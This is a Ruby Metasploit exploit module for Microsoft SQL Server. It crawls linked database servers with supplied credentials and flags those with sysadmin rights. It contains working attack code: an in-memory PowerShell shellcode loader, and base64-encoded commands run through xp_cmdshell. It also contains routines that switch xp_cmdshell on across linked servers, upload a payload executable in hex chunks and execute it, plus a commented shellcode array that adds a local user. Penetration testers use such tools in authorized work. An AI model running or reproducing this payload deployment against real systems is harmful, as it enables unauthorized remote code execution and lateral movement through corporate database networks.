require 'msf/core'
require 'msf/core/exploit/mssql_commands'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking
	
	include Msf::Exploit::Remote::MSSQL
	include Msf::Auxiliary::Report
	include Msf::Exploit::CmdStagerVBS
	#include Msf::Exploit::EXE

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft SQL Server - Database Link Crawler',
			'Description'    => %q{When provided credentials, this module will crawl 
			 SQL Server database links and identify links configured with sysadmin priveleges.},
			'Author'         =>
				[
					'Antti Rantasaari <antti.rantasaari@netspi.com>',  
					'Scott Sutherland "nullbind" <scott.sutherland@netspi.com>'  
				],
			'Platform'       => [ 'Windows' ],
			'License'        => MSF_LICENSE,
			'References'     => [[ 'URL', 'http://www.netspi.com/' ]],
			'Payload'	=> 
				{'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Automatic', { } ],
				],
			'DefaultTarget'  => 0
			 
		))

		register_options(
			[	
				OptBool.new('VERBOSE',  [false, 'Set how verbose the output should be', 'false']),
				OptBool.new('DEPLOY',  [false, 'Deploy payload via the sysadmin links', 'false']),				
			], self.class)
	end
	
	def exploit	
	
		# Set verbosity level
		verbose = datastore['verbose'].to_s.downcase 
		
		# ------------------------------------ test powershell shell code in memory generation
		#myexe = generate_payload_exe
		#mypayload = payload.encoded			
		#exeute 32bit shell code on 64bit system with powershell - http://carnal0wnage.attackresearch.com/2012/05/powershell-shellcode-metasploit-x64.html
		#bypass exception policy in ps - http://www.obscuresecurity.blogspot.com/2011/08/powershell-executionpolicy.html
		# 1 Generate 64 shellcode for payload  - pending - just used exist payload default
		# 2 Generate 32 shellcode for payload  - pending - just used exist payload default
		# 3 Format payloads
		# 4 Create power shell script as var that contains payloads 
		# 5 Unicode encode the scrip
		# 6 Base64 encode the unicode - works
		# 7 Enable powershell code execution - not required
		# 8 Create temp file containing base64 encoded powersshell script 8 chars at a time to deal with xp_cmsshell in ruby and base64 padding (will make it faster later)
		# 9 Execute shell via powershell  -EncodedCommand <base64>  
		#10 Delete temp file
		# add use of temp dir

		# original power shell script - (Matthew Graeber) http://www.exploit-monday.com/2011/10/exploiting-powershells-features-not.html
		# This should be rewritten to use createremotethread or spawn a new process so it doesnt put the sqlserver at risk....at some point
		# Create a new notepad process and inject into it, then delete source file - http://msdn.microsoft.com/en-us/library/windows/desktop/ms682425(v=vs.85).aspx
		# consider calling powershell from powershell and http://stackoverflow.com/questions/1747696/run-a-program-from-powershell-with-timeout
		# exitonthread
		print_status("Original Shellcode:")
		print_status(Rex::Text.to_hex(payload.encoded))
		
		myscript ="$code = @\"
[DllImport(\"kernel32.dll\")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport(\"kernel32.dll\")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport(\"msvcrt.dll\")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
\"@
$winFunc = Add-Type -memberDefinition $code -Name \"Win32\" -namespace Win32Functions -passthru
#[Byte[]]$sc32 =0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x6a,0x01,0x8d,0x85,0xb9,0x00,0x00,0x00,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xf0,0xb5,0xa2,0x56,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5,0x6e,0x65,0x74,0x20,0x75,0x73,0x65,0x72,0x20,0x74,0x65,0x73,0x74,0x20,0x24,0x31,0x4c,0x65,0x74,0x6d,0x65,0x69,0x6e,0x32,0x24,0x20,0x2f,0x61,0x64,0x64,0x00
[Byte[]]$sc32 =#{Rex::Text.to_hex(payload.encoded).gsub('\\',',0').sub(',','')}
[Byte[]]$sc64 = ""
[Byte[]]$sc = $sc32
if ([IntPtr]::Size -eq 8) {$sc = $sc64}
$size = 0x1000
if ($sc.Length -gt 0x1000) {$size = $sc.Length}
$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
$winFunc::CreateThread(0,0,$x,0,0,0)
Start-Sleep -s 120"
		
		# Display shell code
		myshellcode = Rex::Text.to_hex(payload.encoded).gsub('\\',',0').sub(',','')
		print_status("Shellcode formatted for script:")
		print_status(myshellcode)
		
		# Print myscript content 
		# print_status(myscript)
		
		# Unicode encode powershell script
		mytext_uni = Rex::Text.to_unicode(myscript) 

		
		# Base64 encode unicode		
		mytext_64 = Rex::Text.encode_base64(mytext_uni)
		print_status("Base64 of ps script:")
		print_status(mytext_64)
		
		# Enable powershell code execution on server - http://technet.microsoft.com/en-us/library/ee176949.aspx#EFAA
		# not required
		#mssql_xpcmdshell("powershell -Command \"Set-ExecutionPolicy RemoteSigned\"") if mssql_login_datastore 		
		shellcode_len = Rex::Text.to_hex(payload.encoded).gsub('\\',',0').sub(',','').length

		## Generate random file name
		rand_filename = rand_text_alpha(8)
		
		
		## 2500 characters at a time due to xp_cmdshell ruby function limitations
		## http://stackoverflow.com/questions/754407/what-is-the-best-way-to-chop-a-string-into-chunks-of-a-given-length-in-ruby
		mytext_64.scan(/.{1,2500}/).each {|part| 
			print_status("adding to file \"#{rand_filename}\": #{part}") if verbose == "true"
		 	#mssql_xpcmdshell("echo #{part} >> c:\\#{rand_filename}") if mssql_login_datastore
			buildfile_query = "EXEC master..xp_cmdshell 'echo #{part} >> c:\\#{rand_filename}'"
			buildfile_result = mssql_query(buildfile_query, false) if mssql_login_datastore 						
		}
		
		#print debug information
		print_status(mytext_64)
		print_status("length of shellcode: #{shellcode_len}")
		print_status("length of ps script: #{myscript.length}")
		print_status("length of base64: #{mytext_64.length} ")
	
		## Generate base64 encoded powershell command to call shellcode
		powershell_cmd =  "$dacode=(gc c:\\#{rand_filename}) -join '';$dacode=$dacode.Replace(\" \", \"\");powershell.exe -noprofile -encodedCommand $dacode"
		#powershell_cmd =  "$dacode=(gc c:\\#{rand_filename}) -join '';$dacode=$dacode.Replace(\" \", \"\");$p = [diagnostics.process]::start(\"powershell.exe -noprofile -encodedCommand $dacode\")"
		powershell_uni = Rex::Text.to_unicode(powershell_cmd) 
		powershell_64 = Rex::Text.encode_base64(powershell_uni)
		puts powershell_cmd
		puts powershell_64
		
		## Setup and execute shellcode with powershell via xp_cmdshell
		ps_query = "EXEC master..xp_cmdshell 'powershell -EncodedCommand #{powershell_64}'"
		ps_result = mssql_query(ps_query, false) if mssql_login_datastore 	

		## Remove source file
		##delps_query = "EXEC master..xp_cmdshell 'del c:\\#{rand_filename}'"
		##delps_result = mssql_query(delps_query, false) if mssql_login_datastore 			
		# ------------------------------------	
				
		# Display start time	
		time1 = Time.new
		print_status("-------------------------------------------------")
		print_status("Start time : #{time1.inspect}") 
		
		# Display start connection attempt text
		print_status("-------------------------------------------------")
		print_status("Attempting to connect to SQL Server at #{rhost}...")
		
		# Check if credentials are correct
		if (not mssql_login_datastore)
			print_error("Invalid SQL Server credentials")
			print_status("-------------------------------------------------")
			return
		end
				
		# Define master array to keep track of enumerated database information
		masterList = Array.new
		masterList[0] = Hash.new			# Define new hash
		masterList[0]["name"] = ""			# Name of the current database server
		masterList[0]["db_link"] = ""		# Name of the linked database server
		masterList[0]["db_user"] = ""	 	# User configured on the database server link
		masterList[0]["db_sysadmin"] = ""	# Specifies if  the database user configured for the link has sysadmin privileges
		masterList[0]["db_version"] = ""	# Database version of the linked database server
		masterList[0]["db_os"] = ""			# OS of the linked database server
		masterList[0]["path"] = [[]]		# Link path used during crawl - all possible link paths stored
		masterList[0]["done"] = 0			# Used to determine if linked need to be crawled	
		
		# Setup queries for connections	
		versionQuery = "select @@servername,system_user,is_srvrolemember('sysadmin'),(REPLACE(REPLACE(REPLACE(ltrim((select REPLACE((Left(@@Version,CHARINDEX('-',@@version)-1)),'Microsoft','')+ rtrim(CONVERT(char(30), SERVERPROPERTY('Edition'))) +' '+ RTRIM(CONVERT(char(20), SERVERPROPERTY('ProductLevel')))+ CHAR(10))), CHAR(10), ''), CHAR(13), ''), CHAR(9), '')) as version, RIGHT(@@version, LEN(@@version)- 3 -charindex (' ON ',@@VERSION)) as osver,is_srvrolemember('sysadmin')"
		
		# Run initial queries against entry point database		
		result = mssql_query(versionQuery, false) if mssql_login_datastore
		column_data = result[:rows]
		
		column_data.each { |s|
			print_status("Successfully connected to #{rhost} (#{s[0]})")
			masterList[0]["name"] = s[0]
			masterList[0]["db_user"] = s[1]
			masterList[0]["db_sysadmin"] = s[2]
			masterList[0]["db_version"] =  s[3]
			masterList[0]["db_os"] = s[4]	
			
			# Display entry point configuration
			print_status(" ") if verbose == "true"
			print_status("  o Server: #{s[0]}") if verbose == "true"
			print_status("  o User: #{masterList[0]["db_user"]}")	 if verbose == "true"								
			print_status("  o Privs: #{masterList[0]["db_sysadmin"]}")	if verbose == "true"							
			print_status("  o Version: #{masterList[0]["db_version"]}") if verbose == "true"							
			print_status("  o OS: #{masterList[0]["db_os"].strip}") if verbose == "true"
			print_status(" ") if verbose == "true"
		}	

		# Create loot table to store configuration information from crawled database server links
		linked_server_table = Rex::Ui::Text::Table.new(
			'Header'  => 'Linked Server Table',
			'Ident'   => 1,			
			'Columns' => ['db_server', 'db_version', 'db_os', 'link_server', 'link_user', 'link_privilege', 'link_version', 'link_os','link_state']
		)	
		save_loot = ""

		# Start crawling through linked database servers
		while masterList.any? {|f| f["done"] == 0}	
			
			# Find the first DB server that has not been crawled (not marked as done)
			server = masterList.detect {|f| f["done"] == 0}
			
			# Select a list of the linked database servers that exist on the current database server
			sql = query_builder(server["path"].first,"",0,"select srvname from master..sysservers where dataaccess=1 and srvname!=@@servername and srvproduct = 'SQL Server'") 
			result = mssql_query(sql, false) if mssql_login_datastore
		    print_status("-------------------------------------------------")
			print_status("Crawling #{server["name"]}...")	
			
			# If links were found, determine if they can be connected to and add to crawl list
			if (result[:done][:rows] > 0)
				# Enable loot
				save_loot = "yes"
				
				result[:rows].each {|i|
					i.each {|i|
					
						# Check if link works and if sysadmin permissions - temp array to save orig server[path]
						temppath = Array.new
						server["path"].first.each {|j| temppath << j}
						temppath << i

						# Get configuration information from the link					
						sql = query_builder(temppath,"",0,versionQuery)
						result = mssql_query(sql, false) if mssql_login_datastore						
						# Add new servers to masterlist - don't add if link broken or if already there					
						if result[:errors].empty? and result[:rows] != nil then
																
								# Assign db query results to variables for hash
								parse_results = result[:rows]								
								
								# Add link server information to loot
								link_status = 'up'
								write_to_report(i,server,parse_results,linked_server_table,link_status)
								
								# Display link server information in verbose mode
								show_configs(i,parse_results) if verbose == "true"
									
								# Add link to hash
								masterList << add_host(i,server["path"].first,parse_results,verbose) unless masterList.any? {|f| f["name"] == i}	
	
								# Standard link display							
								db_sysadmin = parse_results.pop.pop
								if db_sysadmin == 1 										
									print_good("  o Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")}  - [ !! SYSADMIN PRIVS !!]")
									
									# Deploy payload
									if (datastore['deploy'].to_s.downcase) == "true" then
										print_status("    - Attempting payload deployment... ")
										enable_xp_cmdshell(temppath)
									end
																		
								else								    
									print_status("  o Link path: #{masterList.first["name"]} -> #{temppath.join(" -> ")}")	
									
								end								
						else
						
							# Add to report
							linked_server_table << [server["name"],server["db_version"],server["db_os"],i,'NA','NA','NA','NA','Connection Failed'] 
			
							# Already crawled servers that are linked to from other servers that returned error when trying to issue queryss
							print_status(" ") if verbose == "true"
							print_status("Linked Server: #{i} ") if verbose == "true"
							print_error("  o Link Path: #{masterList.first["name"]} -> #{temppath.join(" -> ")} - Connection Failed")
							print_status("    Failure could be due to:") if verbose == "true"
							print_status("    - A dead server") if verbose == "true"
							print_status("    - Bad credentials") if verbose == "true"
							print_status("    - Nested open queries in SQL 2000") if verbose == "true"

						end
					}
				}
			end
			
			# Set server to "crawled"
			server["done"]=1						
		end
				
		print_status("-------------------------------------------------")
		
		# Setup table for loot
		this_service = nil
		if framework.db and framework.db.active
			this_service = report_service(
				:host  => rhost,
				:port => rport,
				:name => 'mssql',
				:proto => 'tcp'
			)
		end
		
		# Display end time	
		time1 = Time.new
		print_status("End time : #{time1.inspect}")
		print_status("-------------------------------------------------")		
		
		# Write log to loot / file
		if (save_loot=="yes")
			filename= "#{datastore['RHOST']}-#{datastore['RPORT']}_linked_servers.csv"
			path = store_loot("crawled_links", "text/plain", datastore['RHOST'], linked_server_table.to_csv, filename, "Linked servers",this_service)
			print_status("Database link crawl results have been saved to: #{path}")
		end		
		
		#print debug information
		#print_status("#{masterList.inspect}") if verbose == "true"
    end
		
		
	#########################################################
	## Method that builds nested openquery statements using during crawling
	#########################################################
	def query_builder(path,sql,ticks,execute)
		# Temp used to maintain the original masterList[x]["path"]
		temp = Array.new
		path.each {|i| temp << i}
		
		# actual query - defined when the function originally called - ticks multiplied
		if path.length == 0
			return execute.gsub("'","'"*2**ticks)
		# openquery generator
		else
			sql = "select * from openquery(\"" + temp.shift + "\"," + "'"*2**ticks + query_builder(temp,sql,ticks+1,execute) + "'"*2**ticks + ")"
			return sql
		end
	end
	
	#########################################################
	## Method that builds nested openquery statements using during crawling
	#########################################################
	def query_builder_rpc(path,sql,ticks,execute)
		# Temp used to maintain the original masterList[x]["path"]
		temp = Array.new
		path.each {|i| temp << i}
		# actual query - defined when the function originally called - ticks multiplied
		if path.length == 0
			return execute.gsub("'","'"*2**ticks)
		# openquery generator
		else
			exec_at = temp.shift
			sql = "exec(" + "'"*2**ticks + query_builder_rpc(temp,sql,ticks+1,execute) + "'"*2**ticks +") at [" + exec_at + "]"
			return sql
		end
	end
	
	
	
	#########################################################
	## Method for adding new linked database servers to the crawl list
	#########################################################
	def add_host(name,path,parse_results,verbose)
		# Used to add new servers to masterList
		server = Hash.new
		server["name"] = name				# Name of the current database server
		temppath = Array.new
		path.each {|i| temppath << i }
		server["path"] = [temppath]
		server["path"].first << name
		server["done"] = 0		
		parse_results.each {|stuff| 						
			server["db_user"] = stuff.at(1)
			server["db_sysadmin"] = stuff.at(2)
			server["db_version"] =  stuff.at(3)
			server["db_os"] = stuff.at(4)	
		}							
		return server
	end
	
	
	######################################################
	## Method to display configuration information
	######################################################
	def show_configs(i,parse_results)
		print_status(" ")
		print_status("Linked Server: #{i}")
		parse_results.each {|stuff|  
			print_status("  o Link user: #{stuff.at(1)}")	 								
			print_status("  o Link privs: #{stuff.at(2)}")							
			print_status("  o Link version: #{stuff.at(3)}") 			
			print_status("  o Link OS: #{stuff.at(4).strip}") 
		}		
	end
	
	
	#########################################################
	## Method for generating the report and loot
	#########################################################
	def write_to_report(i,server,parse_results,linked_server_table,link_status)
		parse_results.each {|stuff| 						
		
			# Parse server information
			db_link_user = stuff.at(1)
			db_link_sysadmin = stuff.at(2)
			db_link_version =  stuff.at(3)
			db_link_os = stuff.at(4)										
																		
			# Add link server to the reporting array and set link_status to 'up'
			linked_server_table << [server["name"],server["db_version"],server["db_os"],i,db_link_user,db_link_sysadmin,db_link_version,db_link_os,link_status] 
			
			return linked_server_table
		}
	end
	
	#########################################################
	## Method for payload deployment - WEB BASED
	#########################################################
	def deploy_ps_shellcode ()
	end
	
	
	#########################################################
	## Method for enabling xp_cmdshell
	#########################################################
	def enable_xp_cmdshell(path)
		# Enables "show advanced options" and xp_cmdshell if needed and possible
		# They cannot be enabled in user transactions (i.e. via openquery)
		# Only enabled if RPC_Out is enabled for linked server
		# --- Add other ways to enable xp_cmdshell if it's possible; I just don't know how to ---
		# Changes reverted after payload delivery and execution
		
		# First checking if show advanced options enabled
		execute = "select cast(value_in_use as int) FROM  sys.configurations WHERE  name = 'show advanced options'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		saoOrig = result[:rows].pop.pop
		
		# Then checking if xp_cmdshell enabled
		execute = "select cast(value_in_use as int) FROM  sys.configurations WHERE  name = 'xp_cmdshell'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		xpcmdOrig = result[:rows].pop.pop
		
		# Trying blindly to enable xp_cmdshell on linked servers
		# Only works if rpcout is enabled for all links in the link path
		# Otherwise just fails cleanly
		
		if xpcmdOrig == 0 
			if saoOrig == 0
				# Enabling show advanced options and xp_cmdshell
				execute = "sp_configure 'show advanced options',1;reconfigure"
				sql = query_builder_rpc(path,"",0,execute)
				result = mssql_query(sql, false) if mssql_login_datastore
			end
			
			# Enabling xp_cmdshell
			print_status("    - xp_cmdshell not enabled on " + path.last + "... Trying to enable")
			#print_status("xp_cmdshell not enabled on " + path.last + "... Trying to enable")
			execute = "sp_configure 'xp_cmdshell',1;reconfigure"
			sql = query_builder_rpc(path,"",0,execute)
			result = mssql_query(sql, false) if mssql_login_datastore
		end
		
		# Verifying that xp_cmdshell now enabled (could be unsuccessful due to server policies, total removal etc.
		execute = "select cast(value_in_use as int) FROM  sys.configurations WHERE  name = 'xp_cmdshell'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		xpcmdNow = result[:rows].pop.pop
		
		if xpcmdNow == 1 or xpcmdOrig == 1
			print_status("    - xp_cmdshell enabled on " + path.last)
			exe = generate_payload_exe
			powershell_upload_exec(exe,debug=false, path)
			#mssql_upload_exec(exe,debug=false, path)
		else
			print_error("    - Unable to enable xp_cmdshell on " + path.last)
			
		end
		
		# Revert soa and xp_cmdshell to original state
		if xpcmdOrig == 0 and xpcmdNow == 1
			print_status("    - Disabling xp_cmdshell on " + path.last)
			execute = "sp_configure 'xp_cmdshell',0;reconfigure"
			sql = query_builder_rpc(path,"",0,execute)
			result = mssql_query(sql, false) if mssql_login_datastore
		end
		if saoOrig == 0 and xpcmdNow == 1
			execute = "sp_configure 'show advanced options',0;reconfigure"
			sql = query_builder_rpc(path,"",0,execute)
			result = mssql_query(sql, false) if mssql_login_datastore
		end
	end
	
	#
	# Upload and execute a Windows binary through MSSQL queries and Powershell
	# Code from msf3/lib/core/msf/exploit/mssql.rb
	# Couldn't use the library function as the payload has to be wrapped into an openquery statement
	# Also added duplicate line removal (result of openquery over openquery)
	#
	# Exploit path hardcoded as this got a little confused where %temp% is...
	#
	def powershell_upload_exec(exe, debug=false, path)

		# hex converter
		hex = exe.unpack("H*")[0]
		# create random alpha 8 character names
		#var_bypass  = rand_text_alpha(8)
		var_payload = rand_text_alpha(8)
		print_status("    - Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
		# our payload converter, grabs a hex file and converts it to binary for us through powershell
		h2b = "$s = gc 'C:\\TEMP\\#{var_payload}';$s = [string]::Join('', $s);$s = $s.Replace('`r',''); $s = $s.Replace('`n','');$b = new-object byte[] $($s.Length/2);0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)};[IO.File]::WriteAllBytes('C:\\TEMP\\#{var_payload}.exe',$b)"
		h2b_unicode=Rex::Text.to_unicode(h2b)
		# base64 encode it, this allows us to perform execution through powershell without registry changes
		h2b_encoded = Rex::Text.encode_base64(h2b_unicode)
		print_status("    - Uploading the payload #{var_payload}, please be patient...")
		idx = 0
		cnt = 500
		while(idx < hex.length - 1)
			# Adding line markers --idx-- for duplicate removal
			execute = "select 1;exec master..xp_cmdshell 'cmd.exe /c echo --#{idx}--#{hex[idx,cnt]}>>C:\\TEMP\\#{var_payload}'"
			sql = query_builder(path,"",0,execute)
			result = mssql_query(sql, false) if mssql_login_datastore					
			idx += cnt
		end
		
		# Queries over openquery execute multiple times
		# Removing duplicates from #{var_payload}
		var_duplicates = rand_text_alpha(8)
		execute = "select 1;exec master..xp_cmdshell 'powershell -C \"gc C:\\TEMP\\#{var_payload} | get-unique > C:\\TEMP\\#{var_duplicates}\"'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		
		execute = "select 1;exec master..xp_cmdshell 'powershell -C \"gc C:\\TEMP\\#{var_duplicates} | Foreach-Object {$_ -replace \\\"--.*--\\\",\\\"\\\"} | Set-Content C:\\TEMP\\#{var_payload}\"'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		
		###
		
		print_status("    - Converting the payload utilizing PowerShell EncodedCommand...")
		execute = "select 1;exec master..xp_cmdshell 'powershell -EncodedCommand #{h2b_encoded}'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		
		execute = "select 1;exec master..xp_cmdshell 'cmd /c del C:\\TEMP\\#{var_payload}'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		
		execute = "select 1;exec master..xp_cmdshell 'cmd /c del C:\\TEMP\\#{var_duplicates}'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		
		print_status("    - Executing the payload...")
		execute = "select 1;exec master..xp_cmdshell 'C:\\TEMP\\#{var_payload}.exe'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore	
		print_status("    - Be sure to cleanup #{var_payload}.exe...")
	end
	
	#
	# Upload and execute a Windows binary through MSSQL queries
	# Code from msf3/lib/core/msf/exploit/mssql.rb
	# Couldn't use the library function as the payload has to be wrapped into an openquery statement
	#
	# Exploit path hardcoded as this got a little confused where %temp% is...
	#
	def mssql_upload_exec(exe, debug=false, path)
		hex = exe.unpack("H*")[0]

		var_bypass  = rand_text_alpha(8)
		var_payload = rand_text_alpha(8)

		print_status("Warning: This module will leave #{var_payload}.exe in the SQL Server %TEMP% directory")
		print_status("Writing the debug.com loader to the disk...")
		h2b = File.read(datastore['HEX2BINARY'], File.size(datastore['HEX2BINARY']))
		h2b.gsub!(/KemneE3N/, "C:\\TEMP\\#{var_bypass}")
		h2b.split(/\n/).each do |line|
			execute = "select 1;exec master..xp_cmdshell '#{line}'"
			sql = query_builder(path,"",0,execute)
			result = mssql_query(sql, false) if mssql_login_datastore
		end

		print_status("Converting the debug script to an executable...")
		execute = "select 1;exec master..xp_cmdshell 'cmd.exe /c cd C:\\TEMP && cd C:\\TEMP && debug < C:\\TEMP\\#{var_bypass}'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		execute = "select 1;exec master..xp_cmdshell 'cmd.exe /c move C:\\TEMP\\#{var_bypass}.bin C:\\TEMP\\#{var_bypass}.exe'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore

		print_status("Uploading the payload, please be patient...")
		idx = 0
		cnt = 500
		while(idx < hex.length - 1)
			execute = "select 1;exec master..xp_cmdshell 'cmd.exe /c echo #{hex[idx,cnt]}>>C:\\TEMP\\#{var_payload}'"
			sql = query_builder(path,"",0,execute)
			result = mssql_query(sql, false) if mssql_login_datastore
			idx += cnt
		end

		print_status("Converting the encoded payload...")
		execute = "select 1;exec master..xp_cmdshell 'C:\\TEMP\\#{var_bypass}.exe C:\\TEMP\\#{var_payload}'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		execute = "select 1;exec master..xp_cmdshell 'cmd.exe /c del C:\\TEMP\\#{var_bypass}.exe'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
		execute = "select 1;exec master..xp_cmdshell 'cmd.exe /c del C:\\TEMP\\#{var_payload}'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore

		print_status("Executing the payload...")
		execute = "select 1;exec master..xp_cmdshell 'C:\\TEMP\\#{var_payload}.exe'"
		sql = query_builder(path,"",0,execute)
		result = mssql_query(sql, false) if mssql_login_datastore
	end
end